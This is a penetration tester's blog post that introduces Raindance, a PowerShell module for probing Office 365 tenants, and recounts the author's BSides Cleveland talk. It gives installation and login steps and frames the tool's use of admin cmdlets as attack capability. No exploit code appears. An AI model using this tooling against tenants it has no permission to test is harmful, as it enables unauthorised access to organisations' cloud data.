&lt;p&gt;While I was working on Raindance in its beta stage, I presented it to my co-workers. It was received very well. It was good enough that several of them suggested that I present it at the next BSides conference that would be taking place. I reluctantly agreed after much convincing on the part of @ZeroSteiner (I’m not one for speaking to crowds), but it was a good opportunity, and I’m glad I followed through.&lt;/p&gt;

&lt;p&gt;I had the opportunity to meet @Carnal0Wnage the day before the con, and he did a great job of calming my fears. I was under the impression for the longest time that it would just be another “meh” tool. In fact, he had given me some pretty sweet ideas about what else could be done with the power that Powershell offered to us as attackers in the Cloud. It’s a bit early yet to start pulling back curtains and revealing new findings, but I’m optimistic enough to say…they were some pretty frickin’ cool ideas. I’ll probably throw up another blog about it in the near future once the functionality is implemented.&lt;/p&gt;

&lt;p&gt;Anyway, I got the chance to present at BSides Cleveland on June 23, 2018 and it was a hell of an experience. Beers flowing, hackers pwning, good times had by all. The talk went better than I could have hoped for, and I’m looking forward to presenting again. If you would like to catch the video, you can find it on YouTube here on Adrian Crenshaw’s channel&lt;/p&gt;

&lt;!-- Courtesy of embedresponsively.com //--&gt;
&lt;div class=&quot;responsive-video-container&quot;&gt;

  &lt;iframe src=&quot;https://www.youtube.com/embed/VHPZ2YU351M&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;/div&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;

&lt;p&gt;Raindance is a powershell module that can be imported into any Windows machine with Powershell v5.0 and above. Microsoft has promised that &lt;em&gt;eventually&lt;/em&gt; they will be implementing support for Powershell Core v6.0 which will be Linux compatible, but for now, Windows is an inherent requirement.&lt;/p&gt;

&lt;h3 id=&quot;installing-raindance&quot;&gt;Installing Raindance&lt;/h3&gt;
&lt;p&gt;Raindance has a number of dependencies but naturally works within powershell. Start by downloading via github and install any modules as necessary. If you are missing any dependencies, raindance will warn you.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git clone https://github.com/True-Demon/raindance.git C:\path\to\raindance&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;run-powershell-as-admin-install-modules&quot;&gt;Run powershell as Admin, install modules&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;install-module msonline&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;install-module AzureAd&lt;/code&gt;
Say ‘Yes to All’ to the prompts to indicate you want to install all module features.&lt;/p&gt;

&lt;h4 id=&quot;import-raindance&quot;&gt;Import Raindance&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\path\to\raindance\raindance.ps1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And just like that, you’ve got access to raindance.&lt;/p&gt;

&lt;p&gt;Immediately, raindance will offer a login prompt for you to log into a target O365 tenant. One thing I will point out here is that logging into Office 365 is not an exact science, and there are a lot of things that can get in the way like 2-factor authentication, X.509 certificates, white-listing controls, and those &lt;em&gt;very&lt;/em&gt; smart admins who decided their users don’t need Powershell, and so they disable access to O365 via powershell by default.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Psst – Admins, I hope you’re paying attention ;)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If the login prompt fails the first time, don’t give up. Try running &lt;code class=&quot;highlighter-rouge&quot;&gt;Connect-MsolService&lt;/code&gt; without any parameters and see if logging in manually through the pop-up login window works. If it succeeds, then you can continue to use Raindance.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE: In the current version of raindance (As of June 26, 2018) there is a global variable set to indicate whether you have had a successful login. This must contain a valid username for Raindance to allow you to continue. If login succeeds, run
&lt;code class=&quot;highlighter-rouge&quot;&gt;$Global:LOGGED_IN_USER = 'username@target-domain.com'&lt;/code&gt;
This will allow you to proceed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Run &lt;code class=&quot;highlighter-rouge&quot;&gt;Rain-Help&lt;/code&gt; to get a list of all the commands available to you. I’ve taken the time to comment the code somewhat so if you ever feel lost or curious about how things work, just jump in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/raindance/Raindance-Help.png&quot; alt=&quot;Raindance-Help&quot; /&gt;
&lt;em&gt;Raindance Help &amp;amp; Usage&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I leave it to the end-user to experiment with the tool and enjoy exploring the powershell that lies beneath. Everything is running commands from the mentioned Powershell modules and as such are being used as intended. These are the same features used by administrators, and by default are not locked down to prevent you from abusing them.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Go make it Rain :)&lt;/em&gt;&lt;/p&gt;

&lt;p style=&quot;text-align:right;&quot;&gt;&lt;b&gt;-- True Demon&lt;/b&gt;&lt;/p&gt;</content><author><name>True Demon</name></author><summary type="html">If you’ve been performing penetration tests for the last several months, then you may have encountered Office 365 in your travels. Office 365 (O365) for the sake of clarity, is the latest and greatest Cloud solution for various popular Microsoft services including Exchange, Sharepoint, Database management, and a cloud-based active directory serviced called Azure Active Directory. It’s a great service for businesses of all sizes, except that it just a bit too user-friendly for its own good.</summary></entry></feed>